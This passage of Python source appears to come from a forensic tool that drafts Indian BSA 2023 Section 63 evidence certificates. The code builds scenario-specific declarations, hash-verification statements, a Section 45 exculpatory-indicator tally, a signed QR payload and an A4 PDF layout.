        v = self.custodian.get(key)
        return str(v) if v else default

    def _case(self, key: str, default: str = BLANK) -> str:
        v = self.case.get(key)
        return str(v) if v else default

    def _source_type(self) -> str:
        st = self.case.get("source_type")
        if st in SCHEDULE_SOURCES:
            return st
        if self.scenario == ScenarioType.INTERMEDIARY_NODAL:
            return "Server"
        mm = str(self.view["telemetry"].get("make_model", "")).lower()
        if any(k in mm for k in ("android", "iphone", "phone", "handset", "mobile")):
            return "Mobile"
        if any(k in mm for k in ("ssd", "nvme", "hdd", "laptop", "latitude", "disk", "desktop")):
            return "Computer / Storage Media"
        return "Other"

    def _ticks(self) -> str:
        sel = self._source_type()
        return "  ".join(("[X] " if s == sel else "[  ] ") + s for s in SCHEDULE_SOURCES)

    def _device_line(self) -> Dict[str, str]:
        t = self.view["telemetry"]
        get = lambda tk, ck: str(t.get(tk) or self.case.get(ck) or BLANK)  # noqa: E731
        return {"make_model_colour": f"{get('make_model', 'make_model')} / {get('colour', 'colour')}",
                "serial_number": get("serial_number", "serial_number"),
                "identifier": str(t.get("imei") or t.get("uin") or t.get("uid") or t.get("mac") or
                                  t.get("cloud_id") or self.case.get("device_identifier") or BLANK)}

    def part_a_declarations(self) -> List[str]:
        v, s = self.view, self.scenario
        seized_d, seized_t = ist_date_time(self.case.get("seizure_utc"))
        notice_d, _ = ist_date_time(self.case.get("notice_94_utc"))
        receipt = (v["custody"] or {}).get("malkhana_register_receipt") or self._case("malkhana_receipt")
        video = v["video_sha"]
        entity = self._case("entity", self._party("organisation"))
        period = self._case("period")
        paras = [f"I have produced the electronic record / output of the digital record described in Section 1 "
                 f"({v['filename']}, {v['size']} bytes), taken from the device / digital record source ticked there."]
        if s == ScenarioType.VICTIM_COOPERATIVE:
            paras += [
                f"The device is owned by me and was used by me. During the period {period} it was under my lawful "
                f"control and was used regularly to create, store or process information for my personal and "
                f"business activities. I produced it voluntarily to {self._case('io')} for examination and have "
                f"not altered it.",
                "During that period the device was working properly; if at any time it was not working properly or "
                "was out of operation, that has not affected the electronic / digital record or its accuracy.",
                "The device / source of the digital record is: Owned by me and Operated by me.",
            ]
        elif s == ScenarioType.SUSPECT_HOSTILE:
            paras += [
                f"The device was seized by me under {LAW['bnss106']} at {self._case('seizure_place')} on {seized_d} "
                f"at {seized_t} vide seizure memo {self._case('seizure_memo')}, in a search conducted under "
                f"{LAW['bnss105']}. The search and seizure were recorded by audio-video electronic means" + (f"; the recording bears SHA-256 {video} and is bound to the "
                                                       f"acquisition by the bound evidence root" if video else
                                                       "; NO recording hash is bound to this acquisition") +
                f". The device was sealed, deposited in the Malkhana (receipt {receipt}) and sent under seal to "
                f"{self._case('lab')} for imaging.",
                f"The device is a seized exhibit produced from proper custody, and the electronic record taken from it "
                f"is primary evidence under {LAW['sec57_e5']}. The person from whom it was seized has not been asked "
                f"to sign this certificate: no person accused of an offence shall be compelled to be a witness against "
                f"himself ({LAW['art20_3']}; {LAW['selvi']}). I sign PART A as the officer in lawful control of the "
                f"seized device and of the record taken from it during investigation.",
                "Since seizure the device has remained in sealed custody and has not been operated; the record was "
                "taken from it through a write-blocked, read-only acquisition, and the hash values below show that "
                "it has not changed since acquisition.",
                "The device / source of the digital record is: Managed by me (in lawful custody since seizure).",
            ]
        else:
            paras += [
                f"I am the {self._party('designation', 'Nodal Officer')} of {entity}. The records were produced in "
                f"compliance with the notice under {LAW['bnss94']} ({self._case('notice_94')} dated {notice_d}), or a "
                f"direction under {LAW['itact69']} where that applies.",
                f"They are server / transaction logs that {entity} keeps in the ordinary course of business. The "
                f"systems that created them were used regularly for those activities during the period {period}, "
                f"under the lawful control of {entity}, and were working properly; if at any time they were not, "
                f"that has not affected the records or their accuracy.",
                f"The source of the digital record is: Maintained and Managed by {entity}.",
            ]
        ws = v["workstation"] or "the forensic workstation"
        lab = self._case("lab", str(self.expert.get("laboratory") or BLANK))
        if self.track == TrackType.SEC_57_PRIMARY:
            paras.append(
                f"Route: the record produced is a bit-stream copy of the original media, shown identical to it by the "
                f"hash values below. It is offered as the electronic record itself, primary evidence under "
                f"{LAW['sec57_e47']}, and this certificate is furnished in support under Section 63(4).")
        elif s == ScenarioType.SUSPECT_HOSTILE:
            # Two records, two routes: the seized exhibit is primary evidence; the Section 63(2)
            # conditions are stated only for the laboratory computer that produced the output.
            paras.append(
                f"Route: the seized device is a primary exhibit under {LAW['sec57_e5']}, seized under "
                f"{LAW['bnss106']} and recorded under {LAW['bnss105']}; nothing in this certificate states that the "
                f"accused's device was used regularly or operated properly. The record produced is computer output "
                f"generated by the forensic workstation {ws} at {lab} from the write-blocked image of the seized "
                f"device. In terms of Section 63(2) of the Adhiniyam, and as to that workstation only, I state that "
                f"(a) it was produced during the period over which the workstation was used regularly to create, "
                f"store or process information for the forensic examinations regularly carried on by {lab}, which "
                f"has lawful control over its use; (b) during that period information of the kind it contains "
                f"(acquired evidence images) was regularly fed into the workstation in the ordinary course of those "
                f"examinations; (c) throughout the material part of that period the workstation was operating "
                f"properly or, if not, that did not affect the electronic record or the accuracy of its contents; and "
                f"(d) the information it contains reproduces or is derived from the image fed into the workstation "
                f"in the ordinary course of those examinations. The examiner who operated the workstation confirms "
                f"these conditions in PART B.")
        else:
            paras.append(
                "Route: the record produced is computer output. In terms of Section 63(2) of the Adhiniyam I state "
                "that (a) it was produced during the period over which the computer or communication device was used "
                "regularly to create, store or process information for the activities regularly carried on over that "
                "period by the person having lawful control over its use; (b) during that period information of the "
                "kind it contains was regularly fed into the device in the ordinary course of those activities; "
                "(c) throughout the material part of that period the device was operating properly or, if not, that "
                "did not affect the electronic record or the accuracy of its contents; and (d) the information it "
                "contains reproduces or is derived from information fed into the device in the ordinary course of "
                "those activities.")
        paras.append("Where these functions were performed by a combination of computers or communication devices, "
                     "they are treated as a single device for this certificate (Section 63(3)).")
        return paras

    def bad_sector_disclosure(self) -> Optional[str]:
        """The sworn hash statement's qualification when unreadable sectors were filled at acquisition."""
        v = self.view
        if not v["bad_sectors"]:
            return None
        fill = (v["bad_manifest"] or {}).get("fill_pattern") or "0x" + v["fill"].hex().upper()
        return (f"The SHA-256 above is the composite hash of the acquired image in which {len(v['bad_sectors'])} "
                f"unreadable sector(s) of {v['sector_size']} bytes each were padded with the pattern {fill} at "
                f"acquisition; it is not a hash of bytes read from those sectors. The SHA-256 of the readable extent "
                f"only (padded sectors excluded) is {v['sha256_valid'] or NOT_RECORDED}. The padded sectors are "
                f"listed in Annexure BS.")

    def part_b_paragraphs(self) -> List[str]:
        ver = self.verify()
        v = self.view
        name = self.expert.get("name") or BLANK
        lab = self.expert.get("laboratory") or BLANK
        rows = {r["key"]: r for r in ver["hash_rows"]}
        anch = ver["anchors"]
        acq_d, acq_t = ist_date_time(v["ingested_utc"])
        gen_d, _ = ist_date_time(self.generated_utc)
        hash_para = (f"I state that the HASH value of the electronic / digital record is {v['sha256']}, obtained "
                     f"through the SHA-256 algorithm, and that the further values in Section 2 were obtained as shown "
                     f"there. The hash report is enclosed as Annexure H.")
        if v["bad_sectors"]:
            hash_para += " " + str(self.bad_sector_disclosure())
        paras = [f"I, {name}, {self.expert.get('designation') or BLANK}, {lab}, do hereby solemnly affirm and "
                 f"sincerely state and submit as follows:",
                 f"The electronic record / output described in PART A was obtained from the device / digital record "
                 f"source ticked in Section 1 ({self._source_type()}; "
                 f"{v['telemetry'].get('make_model') or 'make not recorded'}).",
                 hash_para]
        video_provisional = v["video_sha"] is not None and not ver["video_verified"]
        if ver["status"] == NOT_FIT:
            paras.append("I am unable to certify that the record is unaltered, because: " +
                         "; ".join(ver["blocking"][:3]) + ("; and further issues listed in Annexure H"
                                                           if len(ver["blocking"]) > 3 else "") +
                         ". This certificate must not be filed until these are resolved.")
        elif rows["sha256"]["status"] == MATCH_EVIDENCE:
            text = (f"On {gen_d} I re-computed these values from the acquired image: the SHA-256, BLAKE2b-512 and "
                    f"Merkle root match the values recorded at acquisition on {acq_d} {acq_t}"
                    + (", the Section 105 BNSS recording matches its recorded hash" if not video_provisional and
                       rows["video_sha"]["status"] == MATCH_EVIDENCE else "")
                    + (f", and {anch['verified']} of {anch['total']} byte anchors relied on in the triage and "
                       f"incident storyline re-hash to their recorded values" if anch["total"] else "")
                    + ". In my opinion the electronic record has not been altered since its acquisition.")
            if video_provisional:
                text += (" PROVISIONAL as to the Section 105 BNSS seizure recording: its SHA-256 is recorded at "
                         "acquisition but the recording " + ("was not presented to me and has not been re-computed"
                                                            if not ver["video_presented"] else
                                                            "did not pass verification") +
                         ", so no opinion is given on the recording or on the bound evidence root derived from it.")
            paras.append(text)
        else:
            paras.append("These values were recorded at acquisition; the acquired image was not presented for this "
                         "certificate, so they have not been re-computed and no opinion on alteration is given here.")
        if self.scenario == ScenarioType.SUSPECT_HOSTILE and self.track == TrackType.SEC_63_2_OUTPUT:
            paras.append(f"I operated the forensic workstation {v['workstation'] or BLANK} that produced the output "
                         f"described in PART A. I confirm that conditions (a) to (d) of {LAW['sec63_2']} stated "
                         f"there hold for that workstation; they are not stated for the seized device, which is a "
                         f"primary exhibit under {LAW['sec57_e5']}.")
        s45 = self.section45_summary()
        if s45["needs_reconciliation"]:
            rec_text = str(self.expert.get("examiner_reconciliation") or "").strip()
            paras.append(f"Section 45 reconciliation: {s45['supports_intrusion_hypothesis']} indicator(s) support an "
                         f"intrusion hypothesis and {s45['undetermined']} could not be determined (Section 3). " +
                         (rec_text if rec_text else
                          "EXAMINER'S RECONCILIATION NOT PROVIDED: the examiner must state, before signing, how "
                          "each of these indicators was examined and why the opinion stands despite them."))
        basis = (f"This opinion is given as the Examiner of Electronic Evidence notified under {LAW['itact79a']}, "
                 f"whose opinion is a relevant fact under {LAW['sec39_2']}") if self.expert.get("notified_79a", True) \
            else f"This opinion is given as an expert under {LAW['sec39_1']}"
        paras.append(basis + f". The grounds on which it rests (Annexures H and X) are relevant under "
                             f"{LAW['sec45']}. The matters stated are true to the best of my knowledge and belief "
                             f"(Section 63(4)).")
        return paras

    S45_GROUPS = (("Critical execution / access", ("C01", "C02", "C03", "C04", "C05", "C06", "C13", "C14")),
                  ("System tampering", ("C07", "C08", "C09", "C10", "C11", "C12")))
    S45_LABEL = "Section 45 BSA Exculpatory Indicator Ratio"

    def section45_summary(self) -> Dict[str, Any]:
        s = (self.b or {}).get("section45_exculpatory_checklist") or {}
        checks = s.get("checks") or []
        evaluated = s.get("checks_evaluated", len(checks))
        determined = s.get("checks_determined", sum(1 for c in checks if c.get("result") != "UNDETERMINED"))
        intr = s.get("supports_intrusion_hypothesis",
                     sum(1 for c in checks if c.get("result") == "SUPPORTS_INTRUSION_HYPOTHESIS"))
        attr = s.get("supports_attribution", sum(1 for c in checks if c.get("result") == "SUPPORTS_ATTRIBUTION"))
        undet = (evaluated - determined) if isinstance(evaluated, int) and isinstance(determined, int) else 0
        p = s.get("trojan_defense_probability")
        if p is None:
            p = (self.b or {}).get("summary_metrics", {}).get("trojan_defense_probability")
        recomputed = round(intr / determined, 4) if determined else None
        strict = round(intr / evaluated, 4) if evaluated else None
        upper = round((intr + undet) / evaluated, 4) if evaluated else None
        groups = []
        for gname, ids in self.S45_GROUPS:
            mem = [c for c in checks if str(c.get("check", ""))[:3] in ids]
            groups.append({"group": gname, "checks": [str(c.get("check", ""))[:3] for c in mem],
                           "supports_attribution": sum(1 for c in mem if c.get("result") == "SUPPORTS_ATTRIBUTION"),
                           "supports_intrusion_hypothesis": sum(1 for c in mem if c.get("result") ==
                                                                "SUPPORTS_INTRUSION_HYPOTHESIS"),
                           "undetermined": sum(1 for c in mem if c.get("result") == "UNDETERMINED"),
                           "intrusion_or_undetermined": [str(c.get("check", "")) for c in mem
                                                         if c.get("result") in ("SUPPORTS_INTRUSION_HYPOTHESIS",
                                                                                "UNDETERMINED")]})
        if strict is not None:
            display = (f"strict {intr}/{evaluated} = {strict:.4f}; defence-favourable upper bound "
                       f"({intr} + {undet} undetermined)/{evaluated} = {upper:.4f}")
        else:
            display = "not evaluated"
        return {"present": bool(s), "label": self.S45_LABEL, "checks_evaluated": evaluated,
                "checks_determined": determined, "supports_attribution": attr, "supports_intrusion_hypothesis": intr,
                "undetermined": undet, "trojan_defense_probability": p, "recomputed_ratio": recomputed,
                "exculpatory_indicator_ratio_strict": strict, "exculpatory_indicator_ratio_upper_bound": upper,
                "ratio_consistent": p is None or recomputed is None or abs(float(p) - recomputed) < 5e-4,
                "display": display, "groups": groups, "needs_reconciliation": bool(intr or undet),
                "examiner_reconciliation": (str(self.expert.get("examiner_reconciliation") or "").strip() or None)
                if (intr or undet) else None,
                "method_note": ("An unweighted count of indicators, not a probability or a calibrated likelihood. "
                                "The strict ratio counts only indicators found to support an intrusion hypothesis; "
                                "the upper bound also counts every undetermined indicator in the defence's favour. "
                                "Sector B's trojan_defense_probability field (intrusion / determined) is kept "
                                "unchanged in the data for compatibility."),
                "sector_b_method_note": s.get("method_note"), "checks": checks, "statute": LAW["sec45"]}

    def certificate_data(self) -> Dict[str, Any]:
        """Everything the certificate prints, as data; its SHA-256 is the certificate digest in the QR."""
        if self._cert is not None:
            return self._cert
        ver = self.verify()
        v = self.view
        s45 = self.section45_summary()
        st = ver["status"]
        cert = {
            "schema": "SUTRA-BSA63-CERTIFICATE/1", "engine": f"{LEGAL_VERSION} {LEGAL_REVISION}",
            "generated_utc": self.generated_utc, "demonstration": self.demo,
            "statute": LAW["schedule"], "scenario": self.scenario.value, "track": self.track.statutory_code,
            "statutory_code": self.track.statutory_code,
            "track_route": self.track.statutory_route, "strict_mode": self.strict, "court": self._case("court", "In the Court of " + BLANK),
            "case": {"fir": self._case("fir", v["case"] or BLANK), "case_reference": v["case"],
                     "offences": self._case("offences")},
            "record": {"evidence_id": v["evidence_id"], "filename": v["filename"], "size_bytes": v["size"],
                       "source_type": self._source_type(), "device": {
                           "make_model": v["telemetry"].get("make_model") or self._case("make_model"),
                           "colour": v["telemetry"].get("colour") or self._case("colour"),
                           "serial_number": v["telemetry"].get("serial_number") or self._case("serial_number"),
                           "identifier": v["telemetry"].get("imei") or self._case("device_identifier")},
                       "acquired_utc": v["ingested_utc"], "workstation": v["workstation"], "examiner_id": v["examiner"],
                       "sector_a_version": v["version"], "admissibility": (v["admissibility"] or {}).get("status")},
            "part_a": {"role": self.scenario.part_a_role, "relation": list(self.scenario.schedule_relation),
                       "signatory": {k: self._party(k) for k in ("name", "relation", "address", "designation",
                                                                 "badge", "police_station", "organisation", "place")},
                       "declarations": self.part_a_declarations(),
                       "hash_statement": {"algorithm": "SHA-256", "value": v["sha256"],
                                          "composite_filled_image": bool(v["bad_sectors"]),
                                          "readable_extent_sha256": v["sha256_valid"] if v["bad_sectors"] else None,
                                          "bad_sector_disclosure": self.bad_sector_disclosure()}},
            "part_b": {"expert": {k: (str(self.expert.get(k)) if self.expert.get(k) not in (None, "") else BLANK)
                                  for k in ("name", "qualification", "designation", "laboratory", "accreditation",
                                            "notification_79a", "place")},
                       "opinion_basis": LAW["sec39_2"] if self.expert.get("notified_79a", True) else LAW["sec39_1"],
                       "device": {"source_ticks": self._ticks(), "source_type": self._source_type(),
                                  "make_model_colour": self._device_line()["make_model_colour"],
                                  "serial_number": self._device_line()["serial_number"],
                                  "identifier": self._device_line()["identifier"]},
                       "algorithm_standard": ALGORITHM_STANDARD_LINE,
                       "hash_table": [{k: r[k] for k in ("label", "algorithm", "recorded", "status")}
                                      for r in ver["hash_rows"]],
                       "section45": {k: s45[k] for k in ("label", "checks_evaluated", "checks_determined",
                                                         "supports_attribution", "supports_intrusion_hypothesis",
                                                         "undetermined", "trojan_defense_probability",
                                                         "exculpatory_indicator_ratio_strict",
                                                         "exculpatory_indicator_ratio_upper_bound", "display",
                                                         "groups", "examiner_reconciliation")},
                       "anchors": {k: ver["anchors"][k] for k in ("total", "verified", "mismatched", "unresolved")},
                       "rfc3161": {"status": v["tsa_status"],
                                   "token_sha256": _sha256_hex(str(v["tsa_token"]).encode()) if v["tsa_token"] else None,
                                   "message_imprint": v["tsa_imprint"]},
                       "paragraphs": self.part_b_paragraphs()},
            "readiness": {"status": st, "blocking": ver["blocking"], "notes": ver["notes"],
                          "signature": "BLOCKED" if st == NOT_FIT else "OPEN",
                          "seizure_recording_verified": ver["video_verified"]},
            "inputs": {"sector_a_manifest_sha256": v["manifest_digest"],
                       "sector_b_manifest_sha256": (self.b or {}).get("manifest_sha256"),
                       "sector_c_storyline_sha256": (self.c or {}).get("storyline_sha256")},
            "annexures": ["H: Hash report", "X: Section 45 grounds (14-point screen)", "S: Incident storyline (Sector C)",
                          "L: Triage leads (Sector B)", "F: Financial trail"] +
                         (["BS: Bad-sector manifest"] if v["bad_sectors"] else []),
        }
        self._cert = cert
        return cert

    def certificate_digest(self) -> str:
        return _sha256_hex(canonical_json(self.certificate_data()))

    # ----- QR --------------------------------------------------------------- #

    def generate_qr_payload(self) -> Dict[str, Any]:
        v = self.view
        payload: Dict[str, Any] = {
            "statute": "BSA 2023 Sec 63(4)(c)", "case": v["case"], "evidence_id": v["evidence_id"],
            "sha256": v["sha256"], "merkle_root": v["merkle_root"], "bound_root": v["bound_root"],
            "ts": v["ingested_utc"], "examiner": v["examiner"],
            "status": {READY: "READY", READY_NOTES: "NOTES", NOT_FIT: "NOT_FIT"}[self.verify()["status"]],
            "cert": self.certificate_digest(),
        }
        key = _audit_key()
        if key:
            payload["mac"] = hmac.new(key, canonical_json(payload), hashlib.sha256).hexdigest()
        return payload

    def _qr_bytes(self) -> bytes:
        return json.dumps(self.generate_qr_payload(), separators=(",", ":"), ensure_ascii=True).encode("ascii")

    def qr_matrix(self) -> Tuple[List[List[bool]], str]:
        if self._qr is None:
            data = self._qr_bytes()
            matrix, engine = qr_matrix(data, "M", prefer_library=self.qr_engine != "builtin")
            if qr_decode(matrix) != data:
                raise RuntimeError("QR self-check failed: the drawn code does not decode to the payload")
            self._qr = (matrix, engine, json.loads(data))
        return self._qr[0], self._qr[1]

    def generate_qr_code_image(self, output_path: str = QR_PNG, scale: int = 8) -> str:
        matrix, _ = self.qr_matrix()
        png = png_from_matrix(matrix, scale=scale)
        if qr_decode(matrix_from_png(png, len(matrix))) != self._qr_bytes():
            raise RuntimeError("QR PNG self-check failed")
        d = os.path.dirname(os.path.abspath(output_path))
        os.makedirs(d, exist_ok=True)
        with open(output_path, "wb") as f:
            f.write(png)
        return output_path

    @staticmethod
    def verify_qr_payload(payload: Union[str, Dict[str, Any]], evidence_manifest: Any = None,
                          certificate: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """What a magistrate's clerk runs on a scanned QR: field-by-field comparison with the manifest."""
        p = json.loads(payload) if isinstance(payload, str) else dict(payload)
        out: Dict[str, Any] = {"fields": {}, "ok": True}
        missing = [k for k in ("statute", "case", "evidence_id", "sha256", "merkle_root", "bound_root") if k not in p]
        if missing:
            out["ok"] = False
            out["missing"] = missing
        if evidence_manifest is not None:
            v = evidence_view(_load_json_input(evidence_manifest, "Sector A evidence manifest") or {})
            for k, vk in (("case", "case"), ("evidence_id", "evidence_id"), ("sha256", "sha256"),
                          ("merkle_root", "merkle_root"), ("bound_root", "bound_root"), ("ts", "ingested_utc"),
                          ("examiner", "examiner")):
                if k in p:
                    out["fields"][k] = p[k] == v[vk]
            if v["merkle_root"] and v["bound_root"]:
                out["fields"]["bound_root_recomputes"] = bound_root(v["merkle_root"], v["video_sha"]) == v["bound_root"]
        if certificate is not None:
            out["fields"]["cert"] = p.get("cert") == _sha256_hex(canonical_json(certificate))
        key = _audit_key()
        if "mac" in p:
            body = {k: x for k, x in p.items() if k != "mac"}
            out["fields"]["mac"] = bool(key) and hmac.compare_digest(
                p["mac"], hmac.new(key, canonical_json(body), hashlib.sha256).hexdigest())
        out["ok"] = out["ok"] and all(out["fields"].values())
        return out

    # ----- PDF -------------------------------------------------------------- #

    def _meta(self, title: str) -> Dict[str, Any]:
        v = self.view
        created = _parse_utc(self.generated_utc) or datetime.datetime.now(datetime.timezone.utc)
        return {"title": title, "author": str(self.expert.get("name") or "SUTRA-Trace Sector D"),
                "subject": f"{LAW['sec63_4c']} certificate - {v['case']} - evidence {v['evidence_id']}",
                "keywords": f"BSA 2023; Section 63(4)(c); The Schedule; {v['case']}; SHA-256 {v['sha256']}",
                "creator": f"SUTRA-Trace {LEGAL_VERSION} {LEGAL_REVISION}",
                "producer": "SUTRA-Trace Sector D PDF pipeline", "created": created}

    def _writer(self) -> Any:
        return ReportLabWriter(self.fonts) if self.pdf_engine == "reportlab" else PurePdfWriter(self.fonts)

    def _status_line(self) -> str:
        ver = self.verify()
        st = ver["status"]
        if st == NOT_FIT:
            return f"STATUS: NOT FIT FOR FILING - {len(ver['blocking'])} blocking issue(s); see opinion and Annexure H"
        if st == READY_NOTES:
            return f"STATUS: READY FOR SIGNATURE WITH {len(ver['notes'])} NOTE(S) - see Annexure H"
        return "STATUS: READY FOR SIGNATURE - all hashes, anchors and bindings verified"

    def _draw_part_a(self, rec: PageRecorder, fs: float) -> bool:
        cert = self.certificate_data()
        v = self.view
        rec.new_page()
        _frame(rec)
        rec.outline("PART A - Certificate by the person in lawful control / management")
        y = _header(rec, cert["court"], "THE SCHEDULE - PART A",
                    "To be filled by the party: the person in lawful control of the device or management of the "
                    "relevant activities", self.verify()["status"], self._status_line(), self.demo)
        fl = _Flow(rec, y, fs)
        fl.heading("1. Identifying particulars of the electronic record (Section 63(4)(a) and (b))")
        qr_box = 150.0
        top_of_table = fl.y
        matrix, engine = self.qr_matrix()
        n = len(matrix)
        module = qr_module_size(n, qr_box - 8)
        qx = X1 - qr_box
        qy = top_of_table - qr_box - 2
        rec.fill_rect(qx, qy, qr_box, qr_box, PALETTE["white"])
        rec.stroke_rect(qx, qy, qr_box, qr_box, PALETTE["border"], 0.6)
        pad = (qr_box - module * (n + 8)) / 2   # centred; the 4-module quiet zone is inside the white box
        rec.qr(qx + pad + 4 * module, qy + pad + 4 * module, module, matrix, PALETTE["black"])
        rec.text(qx + qr_box / 2, qy - 9, "Scan for Merkle proof", "B", 7.4, PALETTE["navy"], "center")
        rec.text(qx + qr_box / 2, qy - 17.5, "BSA 2023 s.63(4)(c) payload, SHA-256 bound", "R", 5.8, PALETTE["muted"],
                 "center")
        seized_d, seized_t = ist_date_time(self.case.get("seizure_utc"))
        custody = v["custody"] or {}
        rows = [("Case / FIR", f"{cert['case']['fir']}"), ("Offences", cert["case"]["offences"]),
                ("Electronic record", f"{v['filename']} ({v['size']} bytes)"),
                ("Evidence ID (Sector A)", v["evidence_id"]),
                ("Device / record source", self._ticks()),
                ("Make & model / colour", self._device_line()["make_model_colour"]),
                ("Serial number", self._device_line()["serial_number"]),
                ("IMEI / UIN / UID / MAC / Cloud ID", self._device_line()["identifier"]),
                ("Acquisition", f"{v['workstation']}, examiner {v['examiner']}, "
                                f"{' '.join(ist_date_time(v['ingested_utc']))}"),
                ("Seizure memo (s.105 / s.106 BNSS)", f"{self._case('seizure_memo')}, {self._case('seizure_place')}, "
                                              f"{seized_d} {seized_t}"
                 if self.scenario != ScenarioType.INTERMEDIARY_NODAL else "Not applicable (records produced on notice)"),
                ("Malkhana receipt", custody.get("malkhana_register_receipt") or self._case("malkhana_receipt")),
                ("Route", f"{self.track.label}: {self.track.statutory_route}")]
        if self.scenario == ScenarioType.INTERMEDIARY_NODAL:
            rows.insert(10, ("Notice (s.94 BNSS)", f"{self._case('notice_94')} dated "
                                                    f"{ist_date_time(self.case.get('notice_94_utc'))[0]}"))
        fl.kv(rows, label_w=112, width=X1 - X0 - qr_box - 10, size=6.9)
        fl.y = min(fl.y, qy - 24)
        fl.heading(f"2. Statement under Section 63 (scenario: {self.scenario.value.replace('_', ' ').title()})")
        sig = cert["part_a"]["signatory"]
        fl.para(f"I, {sig['name']}, {sig['relation']}, {sig['address']}, do hereby solemnly affirm and sincerely "
                f"state and submit as follows:", size=7.4)
        for i, p in enumerate(cert["part_a"]["declarations"], 1):
            fl.para(p, size=7.25, label=f"{i}.")
        fl.heading("3. Hash value of the electronic record")
        fl.para("I state that the HASH value of the electronic / digital record is the value below, obtained through "
                "the SHA-256 algorithm (a legally acceptable standard). The hash report is enclosed as Annexure H.",
                size=7.25)
        if v["bad_sectors"]:
            fl.table(None, [("SHA-256 (composite, padded image)", v["sha256"] or NOT_RECORDED),
                            ("SHA-256 (readable extent only)", v["sha256_valid"] or NOT_RECORDED)],
                     [150, X1 - X0 - 150], keys=["B", "M"], size=7.2)
            fl.para(str(self.bad_sector_disclosure()), size=6.9, color=PALETTE["amber"])
        else:
            fl.table(None, [("SHA-256", v["sha256"] or NOT_RECORDED)], [70, X1 - X0 - 70], keys=["B", "M"], size=7.4)
        _sig_block(fl, [("Name", sig["name"]), ("Capacity", cert["part_a"]["role"]),
                        ("Designation", sig["designation"]), ("Badge / ID", sig["badge"]),
                        ("Police station", sig["police_station"]), ("Organisation", sig["organisation"])],
                   "Signed by the person in lawful control / management (PART A)",
                   blocked=self.verify()["status"] == NOT_FIT)
        _footer(rec, f"SUTRA-Trace {LEGAL_VERSION} {LEGAL_REVISION} | certificate digest "
                     f"{self.certificate_digest()} | QR: {engine}", "Page 1 of 2")
        return not fl.overflow

    def _draw_part_b(self, rec: PageRecorder, fs: float) -> bool:
        cert = self.certificate_data()
        ver = self.verify()
        v = self.view
        rec.new_page()
        _frame(rec)
        rec.outline("PART B - Certificate by the expert")
        y = _header(rec, cert["court"], "THE SCHEDULE - PART B",
                    "To be filled by the expert: Examiner of Electronic Evidence (Section 79A IT Act, 2000) / "
                    "forensic expert", ver["status"], self._status_line(), self.demo)
        fl = _Flow(rec, y, fs)
        e = cert["part_b"]["expert"]
        fl.heading("1. Examiner and laboratory")
        fl.kv([("Examiner", f"{e['name']}, {e['designation']}"), ("Qualification", e["qualification"]),
               ("Laboratory", e["laboratory"]), ("Accreditation", e["accreditation"]),
               ("Section 79A IT Act", e["notification_79a"]),
               ("Device / record source", self._ticks()),
               ("Make & model / colour", self._device_line()["make_model_colour"]),
               ("Serial number", self._device_line()["serial_number"]),
               ("IMEI / UIN / UID / MAC / Cloud ID", self._device_line()["identifier"]),
               ("Method", f"{LAW['iso27037']} identification, acquisition and preservation; read-only acquisition by "
                          f"Sector A ({v['version']}); verification by Sector D ({LEGAL_VERSION} {LEGAL_REVISION})")],
              label_w=118, size=6.7)
        fl.heading("2. Hash integrity and Merkle notarisation table")
        fl.para(ALGORITHM_STANDARD_LINE, key="B", size=6.8)
        trows, tcols = [], []
        for r in ver["hash_rows"]:
            col = PALETTE["emerald"] if r["status"].startswith("MATCH") else PALETTE["red"] if (
                r["status"] == MISMATCH or r["status"].startswith("NOT CONFIRMED")) else PALETTE["amber"]
            trows.append((r["label"], r["algorithm"], r["recorded"] or NOT_RECORDED, r["status"]))
            tcols.append((None, None, None, col))
        w = X1 - X0
        fl.table(("Item", "Algorithm", "Digest recorded at acquisition", "Verification by Sector D"), trows,
                 [w * 0.24, w * 0.1, w * 0.46, w * 0.2], keys=["R", "R", "M", "B"], size=6.5, colors=tcols)
        a = ver["anchors"]
        dig = ", ".join(f"{d['document'].replace('Sector ', '')}: {d['status'].split(' - ')[0]}"
                        for d in ver["digests"])
        nb = sum(1 for b in ver["bindings"] if b["ok"])
        fl.para(f"Byte anchors of Sector B leads and the Sector C storyline re-hashed from the evidence: {a['verified']} "
                f"of {a['total']} match" + (f", {a['mismatched']} MISMATCH" if a["mismatched"] else "") +
                (f", {a['unresolved']} not re-hashable" if a["unresolved"] else "") +
                f". Manifest self-digests: {dig}. Cross-sector bindings: {nb} of {len(ver['bindings'])} hold.",
                size=6.8)
        fl.heading("3. Grounds of opinion: Section 45 BSA 2023 exculpatory indicator screen")
        s45 = cert["part_b"]["section45"]
        grp = "; ".join(f"{g['group']} ({g['checks'][0]}-{g['checks'][-1]} group, {len(g['checks'])} checks): "
                        f"{g['supports_attribution']} attribution, {g['supports_intrusion_hypothesis']} intrusion, "
                        f"{g['undetermined']} undetermined" for g in s45["groups"] if g["checks"])
        fl.kv([("Points evaluated", f"{s45['checks_evaluated']} (Annexure X lists each check and its result)"),
               ("Determined / undetermined", f"{s45['checks_determined']} / {s45['undetermined']}"),
               ("Support attribution to the device user", str(s45["supports_attribution"])),
               ("Support an intrusion hypothesis", str(s45["supports_intrusion_hypothesis"])),
               ("By group", grp or "checks not grouped"),
               (s45["label"], s45["display"] + ". An unweighted count of indicators, not a probability.")],
              label_w=150, size=6.7)
        fl.heading("4. Opinion and certification under Section 63(4)")
        for i, p in enumerate(cert["part_b"]["paragraphs"], 1):
            fl.para(p, size=7.1, label=f"{i}.")
        ts = cert["part_b"]["rfc3161"]
        tsa = ts["status"] + (f"; token SHA-256 {ts['token_sha256']}" if ts["token_sha256"] else "")
        _sig_block(fl, [("Name", e["name"]), ("Qualification", e["qualification"]),
                        ("Designation", e["designation"]), ("Section 79A IT Act", e["notification_79a"]),
                        ("Laboratory", e["laboratory"]), ("RFC 3161 timestamp token", tsa)],
                   "Signed by the expert (PART B)", blocked=ver["status"] == NOT_FIT)
        _footer(rec, f"SUTRA-Trace {LEGAL_VERSION} {LEGAL_REVISION} | certificate digest {self.certificate_digest()}",
                "Page 2 of 2")
        return not fl.overflow

    def _layout_certificate(self) -> PageRecorder:
        rec = PageRecorder(self.fonts, PAGE_W, PAGE_H)
        for draw in (self._draw_part_a, self._draw_part_b):
            fs = 1.0
            while True:
                tmp = PageRecorder(self.fonts, PAGE_W, PAGE_H)
                if draw(tmp, fs):
                    break
                fs = round(fs - 0.04, 2)
                if fs < 0.7:
                    raise RuntimeError(f"certificate page {rec.page_no + 1} does not fit A4 even at {fs:.2f} scale")
            rec.pages.append(tmp.pages[0])
            for t in tmp.text_log:
                rec.text_log.append(dict(t, page=rec.page_no))
